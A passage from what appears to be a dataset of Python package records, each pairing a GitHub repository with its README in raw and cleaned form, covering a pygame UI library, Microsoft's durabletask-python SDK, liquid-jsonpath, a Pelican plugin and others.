jonathan.text = ""start: ""+str(harry.click_start)+"", end: ""+str(harry.click_end)+"", held: ""+str(harry.held)
```


### Adding An Element Post Initialization

```python
play_label = pygame_ui.label(position=[100,100], size=[100,100], text=""play now"", text_size=20)
Interface.add_element('play', play_label)
```

### Adding An Element To A Frame

```python
play_label = pygame_ui.label(position=[100,100], size=[100,100], text=""play now"", text_size=20)
Interface.add_element('play', play_label, 'Arthur->Bertha->Pippinpaddleopsicopolis')
```

### Removing An Element From A Frame

```python
Interface.remove_element('Pippinpaddleopsicopolis', 'Arthur->Bertha')
```

### Get Element Object
```python
play_label = Interface.get_element('play', 'Arthur->Bertha->Pippinpaddleopsicopolis')
play_label.text = 'THE THIRD'
```

### Frame-ception

Just... don't ask me why.

#### Python
```python
import pygame
import pygame_ui

pygame.init()
screen = pygame.display.set_mode((1280, 720), vsync=1)
pygame.display.set_caption(""Frame-ception"")
clock = pygame.time.Clock()

Interface = pygame_ui.init()

path = 'frame0'
for i in range(100):
   frame = 'frame'+str(i+1)
   Interface.add_element(frame, pygame_ui.frame(), path)
   path += '->'+frame

while True:
   for event in pygame.event.get():
      if event.type == pygame.QUIT:
         quit()

   screen.fill((0,0,0))

   Interface.draw(screen)

   pygame.display.flip()
   clock.tick(60)
```

#### JSON
```json
{
   ""frame0"": {
      ""type"": ""frame"",
      ""contents"": {}
   }
}
```

## FAQ

Nothing yet lol.
",rednaxgaming/pygame_ui
durabletask,https://github.com/microsoft/durabletask-python,1,10960,10960,"# Durable Task Client SDK for Python

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Build Validation](https://github.com/microsoft/durabletask-python/actions/workflows/pr-validation.yml/badge.svg)](https://github.com/microsoft/durabletask-python/actions/workflows/pr-validation.yml)

This repo contains a Python client SDK for use with the [Durable Task Framework for Go](https://github.com/microsoft/durabletask-go) and [Dapr Workflow](https://docs.dapr.io/developing-applications/building-blocks/workflow/workflow-overview/). With this SDK, you can define, schedule, and manage durable orchestrations using ordinary Python code.

⚠️ **This SDK is currently under active development and is not yet ready for production use.** ⚠️

> Note that this project is **not** currently affiliated with the [Durable Functions](https://docs.microsoft.com/azure/azure-functions/durable/durable-functions-overview) project for Azure Functions. If you are looking for a Python SDK for Durable Functions, please see [this repo](https://github.com/Azure/azure-functions-durable-python).


## Supported patterns

The following orchestration patterns are currently supported.

### Function chaining

An orchestration can chain a sequence of function calls using the following syntax:

```python
# simple activity function that returns a greeting
def hello(ctx: task.ActivityContext, name: str) -> str:
    return f'Hello {name}!'

# orchestrator function that sequences the activity calls
def sequence(ctx: task.OrchestrationContext, _):
    result1 = yield ctx.call_activity(hello, input='Tokyo')
    result2 = yield ctx.call_activity(hello, input='Seattle')
    result3 = yield ctx.call_activity(hello, input='London')

    return [result1, result2, result3]
```

You can find the full sample [here](./examples/activity_sequence.py).

### Fan-out/fan-in

An orchestration can fan-out a dynamic number of function calls in parallel and then fan-in the results using the following syntax:

```python
# activity function for getting the list of work items
def get_work_items(ctx: task.ActivityContext, _) -> List[str]:
    # ...

# activity function for processing a single work item
def process_work_item(ctx: task.ActivityContext, item: str) -> int:
    # ...

# orchestrator function that fans-out the work items and then fans-in the results
def orchestrator(ctx: task.OrchestrationContext, _):
    # the number of work-items is unknown in advance
    work_items = yield ctx.call_activity(get_work_items)

    # fan-out: schedule the work items in parallel and wait for all of them to complete
    tasks = [ctx.call_activity(process_work_item, input=item) for item in work_items]
    results = yield task.when_all(tasks)

    # fan-in: summarize and return the results
    return {'work_items': work_items, 'results': results, 'total': sum(results)}
```

You can find the full sample [here](./examples/fanout_fanin.py).

### Human interaction and durable timers

An orchestration can wait for a user-defined event, such as a human approval event, before proceding to the next step. In addition, the orchestration can create a timer with an arbitrary duration that triggers some alternate action if the external event hasn't been received:

```python
def purchase_order_workflow(ctx: task.OrchestrationContext, order: Order):
    """"""Orchestrator function that represents a purchase order workflow""""""
    # Orders under $1000 are auto-approved
    if order.Cost < 1000:
        return ""Auto-approved""

    # Orders of $1000 or more require manager approval
    yield ctx.call_activity(send_approval_request, input=order)

    # Approvals must be received within 24 hours or they will be canceled.
    approval_event = ctx.wait_for_external_event(""approval_received"")
    timeout_event = ctx.create_timer(timedelta(hours=24))
    winner = yield task.when_any([approval_event, timeout_event])
    if winner == timeout_event:
        return ""Canceled""

    # The order was approved
    ctx.call_activity(place_order, input=order)
    approval_details = approval_event.get_result()
    return f""Approved by '{approval_details.approver}'""
```

As an aside, you'll also notice that the example orchestration above works with custom business objects. Support for custom business objects includes support for custom classes, custom data classes, and named tuples. Serialization and deserialization of these objects is handled automatically by the SDK.

You can find the full sample [here](./examples/human_interaction.py).

## Feature overview

The following features are currently supported:

### Orchestrations

Orchestrations are implemented using ordinary Python functions that take an `OrchestrationContext` as their first parameter. The `OrchestrationContext` provides APIs for starting child orchestrations, scheduling activities, and waiting for external events, among other things. Orchestrations are fault-tolerant and durable, meaning that they can automatically recover from failures and rebuild their local execution state. Orchestrator functions must be deterministic, meaning that they must always produce the same output given the same input.

### Activities

Activities are implemented using ordinary Python functions that take an `ActivityContext` as their first parameter. Activity functions are scheduled by orchestrations and have at-least-once execution guarantees, meaning that they will be executed at least once but may be executed multiple times in the event of a transient failure. Activity functions are where the real ""work"" of any orchestration is done.

### Durable timers

Orchestrations can schedule durable timers using the `create_timer` API. These timers are durable, meaning that they will survive orchestrator restarts and will fire even if the orchestrator is not actively in memory. Durable timers can be of any duration, from milliseconds to months.

### Sub-orchestrations

Orchestrations can start child orchestrations using the `call_sub_orchestrator` API. Child orchestrations are useful for encapsulating complex logic and for breaking up large orchestrations into smaller, more manageable pieces.

### External events

Orchestrations can wait for external events using the `wait_for_external_event` API. External events are useful for implementing human interaction patterns, such as waiting for a user to approve an order before continuing.

### Continue-as-new (TODO)

Orchestrations can be continued as new using the `continue_as_new` API. This API allows an orchestration to restart itself from scratch, optionally with a new input.

### Suspend, resume, and terminate

Orchestrations can be suspended using the `suspend_orchestration` client API and will remain suspended until resumed using the `resume_orchestration` client API. A suspended orchestration will stop processing new events, but will continue to buffer any that happen to arrive until resumed, ensuring that no data is lost. An orchestration can also be terminated using the `terminate_orchestration` client API. Terminated orchestrations will stop processing new events and will discard any buffered events.

### Retry policies (TODO)

Orchestrations can specify retry policies for activities and sub-orchestrations. These policies control how many times and how frequently an activity or sub-orchestration will be retried in the event of a transient error.

## Getting Started

### Prerequisites

- Python 3.10 or higher
- A Durable Task-compatible sidecar, like [Dapr Workflow](https://docs.dapr.io/developing-applications/building-blocks/workflow/workflow-overview/)

### Installing the Durable Task Python client SDK

Installation is currently only supported from source. Ensure pip, setuptools, and wheel are up-to-date.

```sh
python3 -m pip install --upgrade pip setuptools wheel
```

To install this package from source, clone this repository and run the following command from the project root:

```sh
python3 -m pip install .
```

### Run the samples

See the [examples](./examples) directory for a list of sample orchestrations and instructions on how to run them.

## Development

The following is more information about how to develop this project. Note that development commands require that `make` is installed on your local machine. If you're using Windows, you can install `make` using [Chocolatey](https://chocolatey.org/) or use WSL.

### Generating protobufs

Protobuf definitions are stored in the [./submodules/durabletask-proto](./submodules/durabletask-proto) directory, which is a submodule. To update the submodule, run the following command from the project root:

```sh
git submodule update --init
```

Once the submodule is available, the corresponding source code can be regenerated using the following command from the project root:

```sh
make proto-gen
```

### Running unit tests

Unit tests can be run using the following command from the project root. Unit tests _don't_ require a sidecar process to be running.

```sh
make test-unit
```

### Running E2E tests

The E2E (end-to-end) tests require a sidecar process to be running. You can use the Dapr sidecar for this or run a Durable Task test sidecar using the following `docker` command:

```sh
docker run --name durabletask-sidecar -p 4001:4001 --env 'DURABLETASK_SIDECAR_LOGLEVEL=Debug' --rm cgillum/durabletask-sidecar:latest start --backend Emulator
```

To run the E2E tests, run the following command from the project root:

```sh
make test-e2e
```

## Contributing

This project welcomes contributions and suggestions.  Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft 
trademarks or logos is subject to and must follow 
[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.
","# Durable Task Client SDK for Python

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Build Validation](https://github.com/microsoft/durabletask-python/actions/workflows/pr-validation.yml/badge.svg)](https://github.com/microsoft/durabletask-python/actions/workflows/pr-validation.yml)

This repo contains a Python client SDK for use with the [Durable Task Framework for Go](https://github.com/microsoft/durabletask-go) and [Dapr Workflow](https://docs.dapr.io/developing-applications/building-blocks/workflow/workflow-overview/). With this SDK, you can define, schedule, and manage durable orchestrations using ordinary Python code.

⚠️ **This SDK is currently under active development and is not yet ready for production use.** ⚠️

> Note that this project is **not** currently affiliated with the [Durable Functions](https://docs.microsoft.com/azure/azure-functions/durable/durable-functions-overview) project for Azure Functions. If you are looking for a Python SDK for Durable Functions, please see [this repo](https://github.com/Azure/azure-functions-durable-python).


## Supported patterns

The following orchestration patterns are currently supported.

### Function chaining

An orchestration can chain a sequence of function calls using the following syntax:

```python
# simple activity function that returns a greeting
def hello(ctx: task.ActivityContext, name: str) -> str:
    return f'Hello {name}!'

# orchestrator function that sequences the activity calls
def sequence(ctx: task.OrchestrationContext, _):
    result1 = yield ctx.call_activity(hello, input='Tokyo')
    result2 = yield ctx.call_activity(hello, input='Seattle')
    result3 = yield ctx.call_activity(hello, input='London')

    return [result1, result2, result3]
```

You can find the full sample [here](./examples/activity_sequence.py).

### Fan-out/fan-in

An orchestration can fan-out a dynamic number of function calls in parallel and then fan-in the results using the following syntax:

```python
# activity function for getting the list of work items
def get_work_items(ctx: task.ActivityContext, _) -> List[str]:
    # ...

# activity function for processing a single work item
def process_work_item(ctx: task.ActivityContext, item: str) -> int:
    # ...

# orchestrator function that fans-out the work items and then fans-in the results
def orchestrator(ctx: task.OrchestrationContext, _):
    # the number of work-items is unknown in advance
    work_items = yield ctx.call_activity(get_work_items)

    # fan-out: schedule the work items in parallel and wait for all of them to complete
    tasks = [ctx.call_activity(process_work_item, input=item) for item in work_items]
    results = yield task.when_all(tasks)

    # fan-in: summarize and return the results
    return {'work_items': work_items, 'results': results, 'total': sum(results)}
```

You can find the full sample [here](./examples/fanout_fanin.py).

### Human interaction and durable timers

An orchestration can wait for a user-defined event, such as a human approval event, before proceding to the next step. In addition, the orchestration can create a timer with an arbitrary duration that triggers some alternate action if the external event hasn't been received:

```python
def purchase_order_workflow(ctx: task.OrchestrationContext, order: Order):
    """"""Orchestrator function that represents a purchase order workflow""""""
    # Orders under $1000 are auto-approved
    if order.Cost < 1000:
        return ""Auto-approved""

    # Orders of $1000 or more require manager approval
    yield ctx.call_activity(send_approval_request, input=order)

    # Approvals must be received within 24 hours or they will be canceled.
    approval_event = ctx.wait_for_external_event(""approval_received"")
    timeout_event = ctx.create_timer(timedelta(hours=24))
    winner = yield task.when_any([approval_event, timeout_event])
    if winner == timeout_event:
        return ""Canceled""

    # The order was approved
    ctx.call_activity(place_order, input=order)
    approval_details = approval_event.get_result()
    return f""Approved by '{approval_details.approver}'""
```

As an aside, you'll also notice that the example orchestration above works with custom business objects. Support for custom business objects includes support for custom classes, custom data classes, and named tuples. Serialization and deserialization of these objects is handled automatically by the SDK.

You can find the full sample [here](./examples/human_interaction.py).

## Feature overview

The following features are currently supported:

### Orchestrations

Orchestrations are implemented using ordinary Python functions that take an `OrchestrationContext` as their first parameter. The `OrchestrationContext` provides APIs for starting child orchestrations, scheduling activities, and waiting for external events, among other things. Orchestrations are fault-tolerant and durable, meaning that they can automatically recover from failures and rebuild their local execution state. Orchestrator functions must be deterministic, meaning that they must always produce the same output given the same input.

### Activities

Activities are implemented using ordinary Python functions that take an `ActivityContext` as their first parameter. Activity functions are scheduled by orchestrations and have at-least-once execution guarantees, meaning that they will be executed at least once but may be executed multiple times in the event of a transient failure. Activity functions are where the real ""work"" of any orchestration is done.

### Durable timers

Orchestrations can schedule durable timers using the `create_timer` API. These timers are durable, meaning that they will survive orchestrator restarts and will fire even if the orchestrator is not actively in memory. Durable timers can be of any duration, from milliseconds to months.

### Sub-orchestrations

Orchestrations can start child orchestrations using the `call_sub_orchestrator` API. Child orchestrations are useful for encapsulating complex logic and for breaking up large orchestrations into smaller, more manageable pieces.

### External events

Orchestrations can wait for external events using the `wait_for_external_event` API. External events are useful for implementing human interaction patterns, such as waiting for a user to approve an order before continuing.

### Continue-as-new (TODO)

Orchestrations can be continued as new using the `continue_as_new` API. This API allows an orchestration to restart itself from scratch, optionally with a new input.

### Suspend, resume, and terminate

Orchestrations can be suspended using the `suspend_orchestration` client API and will remain suspended until resumed using the `resume_orchestration` client API. A suspended orchestration will stop processing new events, but will continue to buffer any that happen to arrive until resumed, ensuring that no data is lost. An orchestration can also be terminated using the `terminate_orchestration` client API. Terminated orchestrations will stop processing new events and will discard any buffered events.

### Retry policies (TODO)

Orchestrations can specify retry policies for activities and sub-orchestrations. These policies control how many times and how frequently an activity or sub-orchestration will be retried in the event of a transient error.

## Getting Started

### Prerequisites

- Python 3.10 or higher
- A Durable Task-compatible sidecar, like [Dapr Workflow](https://docs.dapr.io/developing-applications/building-blocks/workflow/workflow-overview/)

### Installing the Durable Task Python client SDK

Installation is currently only supported from source. Ensure pip, setuptools, and wheel are up-to-date.

```sh
python3 -m pip install --upgrade pip setuptools wheel
```

To install this package from source, clone this repository and run the following command from the project root:

```sh
python3 -m pip install .
```

### Run the samples

See the [examples](./examples) directory for a list of sample orchestrations and instructions on how to run them.

## Development

The following is more information about how to develop this project. Note that development commands require that `make` is installed on your local machine. If you're using Windows, you can install `make` using [Chocolatey](https://chocolatey.org/) or use WSL.

### Generating protobufs

Protobuf definitions are stored in the [./submodules/durabletask-proto](./submodules/durabletask-proto) directory, which is a submodule. To update the submodule, run the following command from the project root:

```sh
git submodule update --init
```

Once the submodule is available, the corresponding source code can be regenerated using the following command from the project root:

```sh
make proto-gen
```

### Running unit tests

Unit tests can be run using the following command from the project root. Unit tests _don't_ require a sidecar process to be running.

```sh
make test-unit
```

### Running E2E tests

The E2E (end-to-end) tests require a sidecar process to be running. You can use the Dapr sidecar for this or run a Durable Task test sidecar using the following `docker` command:

```sh
docker run --name durabletask-sidecar -p 4001:4001 --env 'DURABLETASK_SIDECAR_LOGLEVEL=Debug' --rm cgillum/durabletask-sidecar:latest start --backend Emulator
```

To run the E2E tests, run the following command from the project root:

```sh
make test-e2e
```

## Contributing

This project welcomes contributions and suggestions.  Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft 
trademarks or logos is subject to and must follow 
[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.
",microsoft/durabletask-python
wikiseriessjoerdlib,https://github.com/sjoerdvdbos/wikiseriessjoerdlib,0,2666,2666,"===================
wikiseriessjoerdlib
===================

A libary interfacing with Wikipedia to retrieve tv series information.


* Documentation: https://wikiseriessjoerdlib.readthedocs.org/en/latest


Development Workflow
====================

The workflow supports the following steps

 * lint
 * test
 * build
 * document
 * upload
 * graph

These actions are supported out of the box by the corresponding scripts under _CI/scripts directory with sane defaults based on best practices.
Sourcing setup_aliases.ps1 for windows powershell or setup_aliases.sh in bash on Mac or Linux will provide with handy aliases for the shell of all those commands prepended with an underscore.

The bootstrap script creates a .venv directory inside the project directory hosting the virtual environment. It uses pipenv for that.
It is called by all other scripts before they do anything. So one could simple start by calling _lint and that would set up everything before it tried to actually lint the project

Once the code is ready to be delivered the _tag script should be called accepting one of three arguments, patch, minor, major following the semantic versioning scheme.
So for the initial delivery one would call

    $ _tag --minor

which would bump the version of the project to 0.1.0 tag it in git and do a push and also ask for the change and automagically update HISTORY.rst with the version and the change provided.


So the full workflow after git is initialized is:

 * repeat as necessary (of course it could be test - code - lint :) )

   * code
   * lint
   * test
 * commit and push
 * develop more through the code-lint-test cycle
 * tag (with the appropriate argument)
 * build
 * upload (if you want to host your package in pypi)
 * document (of course this could be run at any point)


Important Information
=====================

This template is based on pipenv. In order to be compatible with requirements.txt so the actual created package can be used by any part of the existing python ecosystem some hacks were needed.
So when building a package out of this **do not** simple call

    $ python setup.py sdist bdist_egg

**as this will produce an unusable artifact with files missing.**
Instead use the provided build and upload scripts that create all the necessary files in the artifact.



Project Features
================

* TODO




History
-------

0.0.1 (26-04-2023)
---------------------

* First code creation


0.1.0 (26-04-2023)
------------------

* Initial functionality.


0.1.1 (26-04-2023)
------------------

* Fixing main branch and import


0.1.2 (26-04-2023)
------------------

* Change file to main module and fix import.
","===================
wikiseriessjoerdlib
===================

A libary interfacing with Wikipedia to retrieve tv series information.


* Documentation: https://wikiseriessjoerdlib.readthedocs.org/en/latest


Development Workflow
====================

The workflow supports the following steps

 * lint
 * test
 * build
 * document
 * upload
 * graph

These actions are supported out of the box by the corresponding scripts under _CI/scripts directory with sane defaults based on best practices.
Sourcing setup_aliases.ps1 for windows powershell or setup_aliases.sh in bash on Mac or Linux will provide with handy aliases for the shell of all those commands prepended with an underscore.

The bootstrap script creates a .venv directory inside the project directory hosting the virtual environment. It uses pipenv for that.
It is called by all other scripts before they do anything. So one could simple start by calling _lint and that would set up everything before it tried to actually lint the project

Once the code is ready to be delivered the _tag script should be called accepting one of three arguments, patch, minor, major following the semantic versioning scheme.
So for the initial delivery one would call

    $ _tag --minor

which would bump the version of the project to 0.1.0 tag it in git and do a push and also ask for the change and automagically update HISTORY.rst with the version and the change provided.


So the full workflow after git is initialized is:

 * repeat as necessary (of course it could be test - code - lint :) )

   * code
   * lint
   * test
 * commit and push
 * develop more through the code-lint-test cycle
 * tag (with the appropriate argument)
 * build
 * upload (if you want to host your package in pypi)
 * document (of course this could be run at any point)


Important Information
=====================

This template is based on pipenv. In order to be compatible with requirements.txt so the actual created package can be used by any part of the existing python ecosystem some hacks were needed.
So when building a package out of this **do not** simple call

    $ python setup.py sdist bdist_egg

**as this will produce an unusable artifact with files missing.**
Instead use the provided build and upload scripts that create all the necessary files in the artifact.



Project Features
================

* TODO




History
-------

0.0.1 (26-04-2023)
---------------------

* First code creation


0.1.0 (26-04-2023)
------------------

* Initial functionality.


0.1.1 (26-04-2023)
------------------

* Fixing main branch and import


0.1.2 (26-04-2023)
------------------

* Change file to main module and fix import.
",sjoerdvdbos/wikiseriessjoerdlib
liquid-jsonpath,https://github.com/jg-rp/liquid-jsonpath,2,3675,2480,"<h1 align=""center"">Liquid JSONPath</h1>

<p align=""center"">
<a href=""https://github.com/jg-rp/python-jsonpath"">JSONPath</a> selectors for <a href=""https://jg-rp.github.io/liquid/"">Python Liquid</a>.
</p>

<p align=""center"">
  <a href=""https://github.com/jg-rp/liquid-jsonpath/blob/main/LICENSE"">
    <img src=""https://img.shields.io/pypi/l/liquid-jsonpath.svg?style=flat-square"" alt=""License"">
  </a>
  <br>
  <a href=""https://pypi.org/project/liquid-jsonpath/"">
    <img src=""https://img.shields.io/pypi/v/liquid-jsonpath.svg?style=flat-square"" alt=""PyPi - Version"">
  </a>
  <a href=""https://pypi.org/project/liquid-jsonpath/"">
    <img src=""https://img.shields.io/pypi/pyversions/liquid-jsonpath.svg?style=flat-square"" alt=""Python versions"">
  </a>
  <br>
  <a href=""https://github.com/jg-rp/liquid-jsonpath/actions/workflows/tests.yaml"">
    <img src=""https://img.shields.io/github/actions/workflow/status/jg-rp/liquid-jsonpath/tests.yaml?branch=main&label=tests&style=flat-square"" alt=""Tests"">
  </a>
  <a href=""https://github.com/jg-rp/liquid-jsonpath/actions/workflows/coverage.yaml"">
    <img src=""https://img.shields.io/github/actions/workflow/status/jg-rp/liquid-jsonpath/coverage.yaml?branch=main&label=coverage&style=flat-square"" alt=""Coverage"">
  </a>
</p>

---

**Table of Contents**

- [Installation](#installation)
- [Links](#links)
- [Examples](#examples)
- [License](#license)

## Installation

Install JSONPath for Liquid using [pip](https://pip.pypa.io/en/stable/getting-started/):

```console
python -m pip install -U liquid-jsonpath
```

Or [pipenv](https://pipenv.pypa.io/en/latest/):

```console
pipenv install liquid-jsonpath
```

## Links

- Docs: https://jg-rp.github.io/liquid/jsonpath/introduction
- Change log: https://github.com/jg-rp/liquid-jsonpath/blob/main/CHANGES.md
- PyPi: https://pypi.org/project/liquid-jsonpath/
- Issue tracker: https://github.com/jg-rp/liquid-jsonpath/issues

## Examples

### Filter

This example adds the `find` filter to a Liquid environment. You can think of `find` as an advanced alternative to the standard `map` and `where` filters. It takes a JSONPath string argument and applies it to the filter's left value.

```python
from liquid import Environment
from liquid_jsonpath import Find

env = Environment()
env.add_filter(""find"", Find())

data = {
    ""users"": [
        {
            ""name"": ""Sue"",
            ""score"": 100,
        },
        {
            ""name"": ""John"",
            ""score"": 86,
        },
        {
            ""name"": ""Sally"",
            ""score"": 84,
        },
        {
            ""name"": ""Jane"",
            ""score"": 55,
        },
    ]
}

template = env.from_string(""{{ data | find: '$.users.*.name' | join: ' ' }}"")
print(template.render(data=data))  # Sue John Sally Jane
```

### Tag

This example replaces the standard `{% for %}` tag with one that supports piping an iterable through a JSONPath expression.

```python
from liquid import Environment
from liquid_jsonpath import JSONPathForTag

env = Environment()
env.add_tag(JSONPathForTag)

data = {
    ""users"": [
        {
            ""name"": ""Sue"",
            ""score"": 100,
        },
        {
            ""name"": ""John"",
            ""score"": 86,
        },
        {
            ""name"": ""Sally"",
            ""score"": 84,
        },
        {
            ""name"": ""Jane"",
            ""score"": 55,
        },
    ]
}

template = env.from_string(
    ""{% for name in data | '$.users.*.name' %}""
    ""{{ name }}, ""
    ""{% endfor %}""
)
print(template.render(data=data))  # Sue, John, Sally, Jane,
```

## License

`liquid-jsonpath` is distributed under the terms of the [MIT](https://spdx.org/licenses/MIT.html) license.
","Liquid JSONPath

JSONPath selectors for Python Liquid.





















---

**Table of Contents**

- [Installation](#installation)
- [Links](#links)
- [Examples](#examples)
- [License](#license)

## Installation

Install JSONPath for Liquid using [pip](https://pip.pypa.io/en/stable/getting-started/):

```console
python -m pip install -U liquid-jsonpath
```

Or [pipenv](https://pipenv.pypa.io/en/latest/):

```console
pipenv install liquid-jsonpath
```

## Links

- Docs: https://jg-rp.github.io/liquid/jsonpath/introduction
- Change log: https://github.com/jg-rp/liquid-jsonpath/blob/main/CHANGES.md
- PyPi: https://pypi.org/project/liquid-jsonpath/
- Issue tracker: https://github.com/jg-rp/liquid-jsonpath/issues

## Examples

### Filter

This example adds the `find` filter to a Liquid environment. You can think of `find` as an advanced alternative to the standard `map` and `where` filters. It takes a JSONPath string argument and applies it to the filter's left value.

```python
from liquid import Environment
from liquid_jsonpath import Find

env = Environment()
env.add_filter(""find"", Find())

data = {
    ""users"": [
        {
            ""name"": ""Sue"",
            ""score"": 100,
        },
        {
            ""name"": ""John"",
            ""score"": 86,
        },
        {
            ""name"": ""Sally"",
            ""score"": 84,
        },
        {
            ""name"": ""Jane"",
            ""score"": 55,
        },
    ]
}

template = env.from_string(""{{ data | find: '$.users.*.name' | join: ' ' }}"")
print(template.render(data=data))  # Sue John Sally Jane
```

### Tag

This example replaces the standard `{% for %}` tag with one that supports piping an iterable through a JSONPath expression.

```python
from liquid import Environment
from liquid_jsonpath import JSONPathForTag

env = Environment()
env.add_tag(JSONPathForTag)

data = {
    ""users"": [
        {
            ""name"": ""Sue"",
            ""score"": 100,
        },
        {
            ""name"": ""John"",
            ""score"": 86,
        },
        {
            ""name"": ""Sally"",
            ""score"": 84,
        },
        {
            ""name"": ""Jane"",
            ""score"": 55,
        },
    ]
}

template = env.from_string(
    ""{% for name in data | '$.users.*.name' %}""
    ""{{ name }}, ""
    ""{% endfor %}""
)
print(template.render(data=data))  # Sue, John, Sally, Jane,
```

## License

`liquid-jsonpath` is distributed under the terms of the [MIT](https://spdx.org/licenses/MIT.html) license.
",jg-rp/liquid-jsonpath
pelican-touch,https://github.com/pelican-plugins/touch,2,1432,1432,"Touch: A Plugin for Pelican
===========================

[![Build Status](https://img.shields.io/github/actions/workflow/status/pelican-plugins/touch/main.yml?branch=main)](https://github.com/pelican-plugins/touch/actions)
[![PyPI Version](https://img.shields.io/pypi/v/pelican-touch)](https://pypi.org/project/pelican-touch/)
![License](https://img.shields.io/pypi/l/pelican-touch?color=blue)

This Pelican plugin sets the date on generated files based on source content `Date:` metadata.

Installation
------------

This plugin can be installed via:

    python -m pip install pelican-touch

Usage
-----

This plugin performs `touch` on your generated files, using the date metadata from the source content.

This helps, among other things, to guide the web server regarding how to handle its cache.

Contributing
------------

Contributions are welcome and much appreciated. Every little bit helps. You can contribute by improving the documentation, adding missing features, and fixing bugs. You can also help out by reviewing and commenting on [existing issues][].

To start contributing to this plugin, review the [Contributing to Pelican][] documentation, beginning with the **Contributing Code** section.

[existing issues]: https://github.com/pelican-plugins/touch/issues
[Contributing to Pelican]: https://docs.getpelican.com/en/latest/contribute.html

License
-------

This project is licensed under the AGPL-3.0 license.
","Touch: A Plugin for Pelican
===========================

[![Build Status](https://img.shields.io/github/actions/workflow/status/pelican-plugins/touch/main.yml?branch=main)](https://github.com/pelican-plugins/touch/actions)
[![PyPI Version](https://img.shields.io/pypi/v/pelican-touch)](https://pypi.org/project/pelican-touch/)
![License](https://img.shields.io/pypi/l/pelican-touch?color=blue)

This Pelican plugin sets the date on generated files based on source content `Date:` metadata.

Installation
------------

This plugin can be installed via:

    python -m pip install pelican-touch

Usage
-----

This plugin performs `touch` on your generated files, using the date metadata from the source content.

This helps, among other things, to guide the web server regarding how to handle its cache.

Contributing
------------

Contributions are welcome and much appreciated. Every little bit helps. You can contribute by improving the documentation, adding missing features, and fixing bugs. You can also help out by reviewing and commenting on [existing issues][].

To start contributing to this plugin, review the [Contributing to Pelican][] documentation, beginning with the **Contributing Code** section.

[existing issues]: https://github.com/pelican-plugins/touch/issues
[Contributing to Pelican]: https://docs.getpelican.com/en/latest/contribute.html

License
-------

This project is licensed under the AGPL-3.0 license.
",pelican-plugins/touch
ofa2,https://github.com/ito-rafael/once-for-all-2,1,489,489,"
# OFA²: Train one network, Search once, Deploy in many scenarios [[arXiv]](https://arxiv.org/abs/2303.13683)
```BibTex
@misc{ito2023ofa2,
      title={OFA²: A Multi-Objective Perspective for the Once-for-All Neural Architecture Search},
      author={Rafael C. Ito and Fernando J. Von Zuben},
      year={2023},
      eprint={2303.13683},
      archivePrefix={arXiv},
      primaryClass={cs.NE}
}
```

## Check our [GitHub](https://github.com/ito-rafael/once-for-all-2) for more details.
","
# OFA²: Train one network, Search once, Deploy in many scenarios [[arXiv]](https://arxiv.org/abs/2303.13683)
```BibTex
@misc{ito2023ofa2,
      title={OFA²: A Multi-Objective Perspective for the Once-for-All Neural Architecture Search},
      author={Rafael C. Ito and Fernando J. Von Zuben},
      year={2023},
      eprint={2303.13683},
      archivePrefix={arXiv},
      primaryClass={cs.NE}
}
```

## Check our [GitHub](https://github.com/ito-rafael/once-for-all-2) for more details.
",ito-rafael/once-for-all-2
module-utilities,https://github.com/wpk-nist-gov/module-utilities,2,4725,4466,"<!-- markdownlint-disable MD041 -->

[![Repo][repo-badge]][repo-link] [![Docs][docs-badge]][docs-link]
[![PyPI license][license-badge]][license-link]
[![PyPI version][pypi-badge]][pypi-link]
[![Conda (channel only)][conda-badge]][conda-link]
[![Code style: black][black-badge]][black-link]

<!--
  For more badges, see
  https://shields.io/category/other
  https://naereen.github.io/badges/
  [pypi-badge]: https://badge.fury.io/py/module-utilities
-->

[black-badge]: https://img.shields.io/badge/code%20style-black-000000.svg
[black-link]: https://github.com/psf/black
[pypi-badge]: https://img.shields.io/pypi/v/module-utilities
[pypi-link]: https://pypi.org/project/module-utilities
[docs-badge]: https://img.shields.io/badge/docs-sphinx-informational
[docs-link]: https://pages.nist.gov/module-utilities/
[repo-badge]: https://img.shields.io/badge/--181717?logo=github&logoColor=ffffff
[repo-link]: https://github.com/wpk-nist-gov/module-utilities
[conda-badge]: https://img.shields.io/conda/v/wpk-nist/module-utilities
[conda-link]: https://anaconda.org/wpk-nist/module-utilities
[license-badge]: https://img.shields.io/pypi/l/cmomy?color=informational
[license-link]:
  https://github.com/wpk-nist-gov/module-utilities/blob/main/LICENSE

<!-- other links -->

[cachetools]: https://github.com/tkem/cachetools/

# `module-utilities`

A Python package for creating python modules.

## Overview

I was using the same code snippets over and over, so decided to put them in one
place.

## Features

